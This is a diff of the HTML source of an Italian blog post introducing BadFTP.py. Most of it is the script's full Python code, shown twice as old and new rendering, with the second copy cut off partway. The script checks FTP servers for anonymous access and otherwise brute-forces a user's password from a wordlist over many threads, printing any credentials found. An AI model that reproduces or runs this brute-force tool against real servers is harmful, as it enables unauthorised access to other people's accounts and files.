@@ -6,9 +6,8 @@
   
   <meta http-equiv="content-type" content="text/html; charset=utf-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<meta name="description" content="Introduzione a BadFTP Qualche tempo fa, mostrai come scrivere uno script in Python3 per effettuare il brute forcing delle credenziali FTP trovate il post al seguente link: Brute Force di un Server FTP. Col tempo però, ho sentito l&amp;rsquo;esigenza di modificare lo script per renderlo in un certo senso modulabile.
-Da qui nasce BadFTP.py:
-import sys, ftplib, threading from ftplib import FTP from colorama import init, Fore, Style init() credentials_found = False port = 21 def banner(): print(f&amp;#34;&amp;#34;&amp;#34;{Style." />
+<meta name="description" content=" Introduzione a BadFTP Qualche tempo fa, mostrai come scrivere uno script in Python3 per effettuare il brute forcing delle credenziali FTP trovate il post al seguente link: Brute Force di un Server FTP. Col tempo però, ho sentito l&amp;rsquo;esigenza di modificare lo script per renderlo in un certo senso modulabile.
+" />
 <meta name="keywords" content="" />
 <meta name="robots" content="noodp" />
 <link rel="canonical" href="https://kobra3390.github.io/SpaceHack/posts/badftp-quando-ftp-diventa-bad/badftp_quando_ftp_diventa_bad/" />
@@ -47,9 +46,8 @@ import sys, ftplib, threading from ftplib import FTP from colorama import init, 
 <meta property="og:locale" content="en" />
 <meta property="og:type" content="article" />
 <meta property="og:title" content="BadFTP, quando FTP diventa &#39;BAD&#39;">
-<meta property="og:description" content="Introduzione a BadFTP Qualche tempo fa, mostrai come scrivere uno script in Python3 per effettuare il brute forcing delle credenziali FTP trovate il post al seguente link: Brute Force di un Server FTP. Col tempo però, ho sentito l&amp;rsquo;esigenza di modificare lo script per renderlo in un certo senso modulabile.
-Da qui nasce BadFTP.py:
-import sys, ftplib, threading from ftplib import FTP from colorama import init, Fore, Style init() credentials_found = False port = 21 def banner(): print(f&amp;#34;&amp;#34;&amp;#34;{Style." />
+<meta property="og:description" content=" Introduzione a BadFTP Qualche tempo fa, mostrai come scrivere uno script in Python3 per effettuare il brute forcing delle credenziali FTP trovate il post al seguente link: Brute Force di un Server FTP. Col tempo però, ho sentito l&amp;rsquo;esigenza di modificare lo script per renderlo in un certo senso modulabile.
+" />
 <meta property="og:url" content="https://kobra3390.github.io/SpaceHack/posts/badftp-quando-ftp-diventa-bad/badftp_quando_ftp_diventa_bad/" />
 <meta property="og:site_name" content="HomePage" />
 
@@ -64,6 +62,8 @@ import sys, ftplib, threading from ftplib import FTP from colorama import init, 
 
   <meta property="article:section" content="Network Attacks" />
 
+
+  <meta property="article:published_time" content="0001-01-01 00:00:00 &#43;0000 UTC" />
 
 
 
@@ -144,7 +144,7 @@ import sys, ftplib, threading from ftplib import FTP from colorama import init, 
       <span class="post-author">Autore: k0Br@3390</span>
     
     
-      <span class="post-reading-time">:: 8 min read (1522 words)</span>
+      <span class="post-reading-time">:: 8 min read (1527 words)</span>
     
   </div>
 
@@ -165,183 +165,203 @@ import sys, ftplib, threading from ftplib import FTP from colorama import init, 
 
 
   
+    <div class="table-of-contents">
+      <h2>
+        Table of Contents
+      </h2>
+      <nav id="TableOfContents">
+  <ul>
+    <li><a href="#introduzione-a-badftp">Introduzione a BadFTP</a>
+      <ul>
+        <li><a href="#introduzione-a-fail2ban">Introduzione a Fail2ban</a>
+          <ul>
+            <li><a href="#cosè-fail2ban">Cos&rsquo;è Fail2ban</a></li>
+          </ul>
+        </li>
+      </ul>
+    </li>
+  </ul>
+</nav>
+    </div>
+  
 
   <div class="post-content"><div>
-        <h1 id="introduzione-a-badftp">Introduzione a BadFTP<a href="#introduzione-a-badftp" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h1>
+        <hr>
+<h1 id="introduzione-a-badftp">Introduzione a BadFTP<a href="#introduzione-a-badftp" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h1>
 <p>Qualche tempo fa, mostrai come scrivere uno script in Python3 per effettuare il brute forcing delle credenziali FTP trovate il post al seguente link: <a href="https://kobra3390.github.io/SpaceHack/posts/brute-force-ftp-server/brute_force_server_ftp/">Brute Force di un Server FTP</a>. Col tempo però, ho sentito l&rsquo;esigenza di modificare lo script per renderlo in un certo senso <code>modulabile</code>.</p>
 <p>Da qui nasce <code>BadFTP.py</code>:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">import</span> sys<span style="color:#f92672">,</span> ftplib<span style="color:#f92672">,</span> threading
-<span style="color:#f92672">from</span> ftplib <span style="color:#f92672">import</span> FTP
-<span style="color:#f92672">from</span> colorama <span style="color:#f92672">import</span> init, Fore, Style
-
-init()
-credentials_found <span style="color:#f92672">=</span> <span style="color:#66d9ef">False</span>
-port <span style="color:#f92672">=</span> <span style="color:#ae81ff">21</span>
-
-<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">banner</span>():
-    print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;&#34;&#34;</span><span style="color:#e6db74">{</span>Style<span style="color:#f92672">.</span>BRIGHT<span style="color:#e6db74">}</span><span style="color:#e6db74">                    
-</span><span style="color:#e6db74">     _____       _ _____ _____ _____ 
-</span><span style="color:#e6db74">    | __  |___ _| |   __|_   _|  _  |
-</span><span style="color:#e6db74">    | __ -| .&#39;| . |   __| | | |   __|
-</span><span style="color:#e6db74">    |_____|__,|___|__|    |_| |__|   
-</span><span style="color:#e6db74">                                 
-</span><span style="color:#e6db74">        </span><span style="color:#e6db74">{</span>Style<span style="color:#f92672">.</span>RESET_ALL<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;&#34;&#34;</span>)
-
-<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">check_anonymous_ftp</span>(server, port<span style="color:#f92672">=</span><span style="color:#ae81ff">21</span>):
-    <span style="color:#66d9ef">try</span>:
-        ftp <span style="color:#f92672">=</span> FTP()
-        ftp<span style="color:#f92672">.</span>connect(server, port)
-        ftp<span style="color:#f92672">.</span>login(<span style="color:#e6db74">&#39;anonymous&#39;</span>, <span style="color:#e6db74">&#39;anonymous@domain.com&#39;</span>)
-        <span style="color:#66d9ef">return</span> ftp  
-    <span style="color:#66d9ef">except</span> <span style="color:#a6e22e">Exception</span> <span style="color:#66d9ef">as</span> e:
-        <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">None</span>
-
-<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">is_correct</span>(username, password):
-    <span style="color:#66d9ef">global</span> credentials_found
-
-    <span style="color:#66d9ef">if</span> credentials_found:
-        <span style="color:#66d9ef">return</span>
-
-    server <span style="color:#f92672">=</span> ftplib<span style="color:#f92672">.</span>FTP()
-    print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;[!] Trying </span><span style="color:#e6db74">{</span>Style<span style="color:#f92672">.</span>BRIGHT<span style="color:#e6db74">}{</span>password<span style="color:#e6db74">}{</span>Style<span style="color:#f92672">.</span>RESET_ALL<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
-    <span style="color:#66d9ef">try</span>:
-        server<span style="color:#f92672">.</span>connect(host, port, timeout<span style="color:#f92672">=</span><span style="color:#ae81ff">5</span>)
-        server<span style="color:#f92672">.</span>login(username, password)
-    <span style="color:#66d9ef">except</span> ftplib<span style="color:#f92672">.</span>error_perm:
-        <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">False</span>
-    <span style="color:#66d9ef">else</span>:
-        print(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">{</span>Style<span style="color:#f92672">.</span>BRIGHT<span style="color:#e6db74">}</span><span style="color:#e6db74">-</span><span style="color:#e6db74">{</span>Style<span style="color:#f92672">.</span>RESET_ALL<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">30</span>)
-        print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">{</span>Style<span style="color:#f92672">.</span>BRIGHT<span style="color:#e6db74">}{</span>Fore<span style="color:#f92672">.</span>GREEN<span style="color:#e6db74">}</span><span style="color:#e6db74">[+] Found credentials: </span><span style="color:#e6db74">{</span>Style<span style="color:#f92672">.</span>RESET_ALL<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
-        print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\t</span><span style="color:#e6db74">Host: </span><span style="color:#e6db74">{</span>Style<span style="color:#f92672">.</span>BRIGHT<span style="color:#e6db74">}{</span>host<span style="color:#e6db74">}{</span>Style<span style="color:#f92672">.</span>RESET_ALL<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
-        print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\t</span><span style="color:#e6db74">User: </span><span style="color:#e6db74">{</span>Style<span style="color:#f92672">.</span>BRIGHT<span style="color:#e6db74">}{</span>username<span style="color:#e6db74">}{</span>Style<span style="color:#f92672">.</span>RESET_ALL<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
-        print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\t</span><span style="color:#e6db74">Password: </span><span style="color:#e6db74">{</span>Style<span style="color:#f92672">.</span>BRIGHT<span style="color:#e6db74">}{</span>password<span style="color:#e6db74">}{</span>Style<span style="color:#f92672">.</span>RESET_ALL<span style="color:#e6db74">}{</span>Fore<span style="color:#f92672">.</span>RESET<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
-        print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">{</span>Style<span style="color:#f92672">.</span>BRIGHT<span style="color:#e6db74">}</span><span style="color:#e6db74">-</span><span style="color:#e6db74">{</span>Style<span style="color:#f92672">.</span>RESET_ALL<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">30</span>)
-        credentials_found <span style="color:#f92672">=</span> <span style="color:#66d9ef">True</span>
-        <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">True</span>
-
-<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">list_ftp_directory</span>(ftp):
-    <span style="color:#66d9ef">try</span>:
-        print(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">{</span>Style<span style="color:#f92672">.</span>BRIGHT<span style="color:#e6db74">}</span><span style="color:#e6db74">-</span><span style="color:#e6db74">{</span>Style<span style="color:#f92672">.</span>RESET_ALL<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">30</span>)
-        print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">{</span>Style<span style="color:#f92672">.</span>BRIGHT<span style="color:#e6db74">}</span><span style="color:#e6db74">Contents of the root directory:</span><span style="color:#e6db74">{</span>Fore<span style="color:#f92672">.</span>RESET<span style="color:#e6db74">}</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>)
-        contents <span style="color:#f92672">=</span> ftp<span style="color:#f92672">.</span>nlst()
-        <span style="color:#66d9ef">for</span> item <span style="color:#f92672">in</span> contents:
-            print(item)
-        print(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">{</span>Style<span style="color:#f92672">.</span>BRIGHT<span style="color:#e6db74">}</span><span style="color:#e6db74">-</span><span style="color:#e6db74">{</span>Style<span style="color:#f92672">.</span>RESET_ALL<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">30</span>)
-    <span style="color:#66d9ef">except</span> <span style="color:#a6e22e">Exception</span> <span style="color:#66d9ef">as</span> e:
-        print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">{</span>Fore<span style="color:#f92672">.</span>RED<span style="color:#e6db74">}</span><span style="color:#e6db74">Error listing directory: </span><span style="color:#e6db74">{</span>str(e)<span style="color:#e6db74">}{</span>Fore<span style="color:#f92672">.</span>RESET<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
-
-<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">password_checker</span>(username, passwords):
-    <span style="color:#66d9ef">for</span> password <span style="color:#f92672">in</span> passwords:
-        <span style="color:#66d9ef">if</span> is_correct(username, password):
-            <span style="color:#66d9ef">break</span>
-
-<span style="color:#66d9ef">if</span> __name__ <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;__main__&#34;</span>:
-    banner()
-    init(autoreset<span style="color:#f92672">=</span><span style="color:#66d9ef">True</span>)
-
-    <span style="color:#66d9ef">if</span> len(sys<span style="color:#f92672">.</span>argv) <span style="color:#f92672">!=</span> <span style="color:#ae81ff">4</span>:
-        print(Fore<span style="color:#f92672">.</span>RED <span style="color:#f92672">+</span> <span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">{</span>Style<span style="color:#f92672">.</span>BRIGHT<span style="color:#e6db74">}</span><span style="color:#e6db74">Usage: python3 script.py ftp_server_ip_address username wordlist_file</span><span style="color:#e6db74">{</span>Style<span style="color:#f92672">.</span>RESET_ALL<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
-        sys<span style="color:#f92672">.</span>exit(<span style="color:#ae81ff">1</span>)
-
-    host <span style="color:#f92672">=</span> sys<span style="color:#f92672">.</span>argv[<span style="color:#ae81ff">1</span>]
-    user <span style="color:#f92672">=</span> sys<span style="color:#f92672">.</span>argv[<span style="color:#ae81ff">2</span>]
-    wordlist_file <span style="color:#f92672">=</span> sys<span style="color:#f92672">.</span>argv[<span style="color:#ae81ff">3</span>]
-
-    ftp_client <span style="color:#f92672">=</span> check_anonymous_ftp(host)
-
-    <span style="color:#66d9ef">if</span> ftp_client:
-        print(Fore<span style="color:#f92672">.</span>GREEN <span style="color:#f92672">+</span> <span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">The FTP server at </span><span style="color:#e6db74">{</span>Style<span style="color:#f92672">.</span>BRIGHT<span style="color:#e6db74">}</span><span style="color:#e6db74">[ </span><span style="color:#e6db74">{</span>host<span style="color:#e6db74">}</span><span style="color:#e6db74"> ]</span><span style="color:#e6db74">{</span>Style<span style="color:#f92672">.</span>RESET_ALL<span style="color:#e6db74">}</span><span style="color:#e6db74"> </span><span style="color:#e6db74">{</span>Fore<span style="color:#f92672">.</span>GREEN<span style="color:#e6db74">}</span><span style="color:#e6db74">allows anonymous access.&#39;</span>)
-        list_ftp_directory(ftp_client) 
-    <span style="color:#66d9ef">else</span>:
-        print(Fore<span style="color:#f92672">.</span>RED <span style="color:#f92672">+</span> <span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">The FTP server at </span><span style="color:#e6db74">{</span>Style<span style="color:#f92672">.</span>BRIGHT<span style="color:#e6db74">}</span><span style="color:#e6db74">[ </span><span style="color:#e6db74">{</span>host<span style="color:#e6db74">}</span><span style="color:#e6db74"> ]</span><span style="color:#e6db74">{</span>Style<span style="color:#f92672">.</span>RESET_ALL<span style="color:#e6db74">}</span><span style="color:#e6db74"> </span><span style="color:#e6db74">{</span>Fore<span style="color:#f92672">.</span>RED<span style="color:#e6db74">}</span><span style="color:#e6db74">does not allow anonymous access or is unreachable.&#39;</span>)
-
-        passwords <span style="color:#f92672">=</span> open(wordlist_file)<span style="color:#f92672">.</span>read()<span style="color:#f92672">.</span>split(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>)
-        print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">[+] Passwords to try: </span><span style="color:#e6db74">{</span>Style<span style="color:#f92672">.</span>BRIGHT<span style="color:#e6db74">}{</span>len(passwords)<span style="color:#e6db74">}{</span>Style<span style="color:#f92672">.</span>RESET_ALL<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
-
-        chunk_size <span style="color:#f92672">=</span> <span style="color:#ae81ff">10</span>
-        password_chunks <span style="color:#f92672">=</span> [passwords[i:i<span style="color:#f92672">+</span>chunk_size] <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">0</span>, len(passwords), chunk_size)]
-
-        threads <span style="color:#f92672">=</span> []
-        <span style="color:#66d9ef">for</span> chunk <span style="color:#f92672">in</span> password_chunks:
-            thread <span style="color:#f92672">=</span> threading<span style="color:#f92672">.</span>Thread(target<span style="color:#f92672">=</span>password_checker, args<span style="color:#f92672">=</span>(user, chunk,))
-            thread<span style="color:#f92672">.</span>start()
-            threads<span style="color:#f92672">.</span>append(thread)
-
-        <span style="color:#66d9ef">for</span> thread <span style="color:#f92672">in</span> threads:
-            thread<span style="color:#f92672">.</span>join()
-</code></pre></div><p>Cosa differenzia BadFTP dallo script presente nel post che vi ho menzionato sopra? Proprio il fatto che BadFTP è <code>modulabile</code>. Lo script infatti verifica se il server FTP remoto è configurato in modo errato per poter permetter l&rsquo;accesso come anonymous, in caso positivo, elenca i file presenti sul server FTP, in caso negativo tenta di fare il brute forcing.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">import</span> sys<span style="color:#f92672">,</span> ftplib<span style="color:#f92672">,</span> threading
+</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> ftplib <span style="color:#f92672">import</span> FTP
+</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> colorama <span style="color:#f92672">import</span> init, Fore, Style
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>init()
+</span></span><span style="display:flex;"><span>credentials_found <span style="color:#f92672">=</span> <span style="color:#66d9ef">False</span>
+</span></span><span style="display:flex;"><span>port <span style="color:#f92672">=</span> <span style="color:#ae81ff">21</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">banner</span>():
+</span></span><span style="display:flex;"><span>    print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;&#34;&#34;</span><span style="color:#e6db74">{</span>Style<span style="color:#f92672">.</span>BRIGHT<span style="color:#e6db74">}</span><span style="color:#e6db74">                    
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">     _____       _ _____ _____ _____ 
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    | __  |___ _| |   __|_   _|  _  |
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    | __ -| .&#39;| . |   __| | | |   __|
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">    |_____|__,|___|__|    |_| |__|   
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">                                 
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">        </span><span style="color:#e6db74">{</span>Style<span style="color:#f92672">.</span>RESET_ALL<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;&#34;&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">check_anonymous_ftp</span>(server, port<span style="color:#f92672">=</span><span style="color:#ae81ff">21</span>):
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">try</span>:
+</span></span><span style="display:flex;"><span>        ftp <span style="color:#f92672">=</span> FTP()
+</span></span><span style="display:flex;"><span>        ftp<span style="color:#f92672">.</span>connect(server, port)
+</span></span><span style="display:flex;"><span>        ftp<span style="color:#f92672">.</span>login(<span style="color:#e6db74">&#39;anonymous&#39;</span>, <span style="color:#e6db74">&#39;anonymous@domain.com&#39;</span>)
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> ftp  
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">except</span> <span style="color:#a6e22e">Exception</span> <span style="color:#66d9ef">as</span> e:
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">None</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">is_correct</span>(username, password):
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">global</span> credentials_found
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> credentials_found:
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    server <span style="color:#f92672">=</span> ftplib<span style="color:#f92672">.</span>FTP()
+</span></span><span style="display:flex;"><span>    print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;[!] Trying </span><span style="color:#e6db74">{</span>Style<span style="color:#f92672">.</span>BRIGHT<span style="color:#e6db74">}{</span>password<span style="color:#e6db74">}{</span>Style<span style="color:#f92672">.</span>RESET_ALL<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">try</span>:
+</span></span><span style="display:flex;"><span>        server<span style="color:#f92672">.</span>connect(host, port, timeout<span style="color:#f92672">=</span><span style="color:#ae81ff">5</span>)
+</span></span><span style="display:flex;"><span>        server<span style="color:#f92672">.</span>login(username, password)
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">except</span> ftplib<span style="color:#f92672">.</span>error_perm:
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">False</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">else</span>:
+</span></span><span style="display:flex;"><span>        print(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">{</span>Style<span style="color:#f92672">.</span>BRIGHT<span style="color:#e6db74">}</span><span style="color:#e6db74">-</span><span style="color:#e6db74">{</span>Style<span style="color:#f92672">.</span>RESET_ALL<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">30</span>)
+</span></span><span style="display:flex;"><span>        print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">{</span>Style<span style="color:#f92672">.</span>BRIGHT<span style="color:#e6db74">}{</span>Fore<span style="color:#f92672">.</span>GREEN<span style="color:#e6db74">}</span><span style="color:#e6db74">[+] Found credentials: </span><span style="color:#e6db74">{</span>Style<span style="color:#f92672">.</span>RESET_ALL<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
+</span></span><span style="display:flex;"><span>        print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\t</span><span style="color:#e6db74">Host: </span><span style="color:#e6db74">{</span>Style<span style="color:#f92672">.</span>BRIGHT<span style="color:#e6db74">}{</span>host<span style="color:#e6db74">}{</span>Style<span style="color:#f92672">.</span>RESET_ALL<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
+</span></span><span style="display:flex;"><span>        print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\t</span><span style="color:#e6db74">User: </span><span style="color:#e6db74">{</span>Style<span style="color:#f92672">.</span>BRIGHT<span style="color:#e6db74">}{</span>username<span style="color:#e6db74">}{</span>Style<span style="color:#f92672">.</span>RESET_ALL<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
+</span></span><span style="display:flex;"><span>        print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\t</span><span style="color:#e6db74">Password: </span><span style="color:#e6db74">{</span>Style<span style="color:#f92672">.</span>BRIGHT<span style="color:#e6db74">}{</span>password<span style="color:#e6db74">}{</span>Style<span style="color:#f92672">.</span>RESET_ALL<span style="color:#e6db74">}{</span>Fore<span style="color:#f92672">.</span>RESET<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
+</span></span><span style="display:flex;"><span>        print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">{</span>Style<span style="color:#f92672">.</span>BRIGHT<span style="color:#e6db74">}</span><span style="color:#e6db74">-</span><span style="color:#e6db74">{</span>Style<span style="color:#f92672">.</span>RESET_ALL<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">30</span>)
+</span></span><span style="display:flex;"><span>        credentials_found <span style="color:#f92672">=</span> <span style="color:#66d9ef">True</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">True</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">list_ftp_directory</span>(ftp):
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">try</span>:
+</span></span><span style="display:flex;"><span>        print(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">{</span>Style<span style="color:#f92672">.</span>BRIGHT<span style="color:#e6db74">}</span><span style="color:#e6db74">-</span><span style="color:#e6db74">{</span>Style<span style="color:#f92672">.</span>RESET_ALL<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">30</span>)
+</span></span><span style="display:flex;"><span>        print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">{</span>Style<span style="color:#f92672">.</span>BRIGHT<span style="color:#e6db74">}</span><span style="color:#e6db74">Contents of the root directory:</span><span style="color:#e6db74">{</span>Fore<span style="color:#f92672">.</span>RESET<span style="color:#e6db74">}</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>)
+</span></span><span style="display:flex;"><span>        contents <span style="color:#f92672">=</span> ftp<span style="color:#f92672">.</span>nlst()
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">for</span> item <span style="color:#f92672">in</span> contents:
+</span></span><span style="display:flex;"><span>            print(item)
+</span></span><span style="display:flex;"><span>        print(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">{</span>Style<span style="color:#f92672">.</span>BRIGHT<span style="color:#e6db74">}</span><span style="color:#e6db74">-</span><span style="color:#e6db74">{</span>Style<span style="color:#f92672">.</span>RESET_ALL<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">30</span>)
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">except</span> <span style="color:#a6e22e">Exception</span> <span style="color:#66d9ef">as</span> e:
+</span></span><span style="display:flex;"><span>        print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">{</span>Fore<span style="color:#f92672">.</span>RED<span style="color:#e6db74">}</span><span style="color:#e6db74">Error listing directory: </span><span style="color:#e6db74">{</span>str(e)<span style="color:#e6db74">}{</span>Fore<span style="color:#f92672">.</span>RESET<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">password_checker</span>(username, passwords):
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> password <span style="color:#f92672">in</span> passwords:
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> is_correct(username, password):
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">break</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> __name__ <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;__main__&#34;</span>:
+</span></span><span style="display:flex;"><span>    banner()
+</span></span><span style="display:flex;"><span>    init(autoreset<span style="color:#f92672">=</span><span style="color:#66d9ef">True</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> len(sys<span style="color:#f92672">.</span>argv) <span style="color:#f92672">!=</span> <span style="color:#ae81ff">4</span>:
